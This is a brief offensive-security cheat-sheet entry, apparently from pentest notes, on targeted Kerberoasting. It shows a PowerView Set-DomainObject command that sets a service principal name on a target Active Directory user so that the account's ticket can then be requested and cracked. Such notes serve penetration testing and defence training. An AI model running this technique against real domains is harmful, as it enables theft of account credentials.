### Kerberoastin - Set SPN

If we have sufficient right, a target user's SPN can be set to anything in the domain (unique in the domain) and then kerberoasted

To set the SPN to the user using powerview:

```
Set-DomainObject -Identity <$Target user> -Set @{serviceprincipalname='<$Domain/myspn>'}
```

now you can kerberoast it.
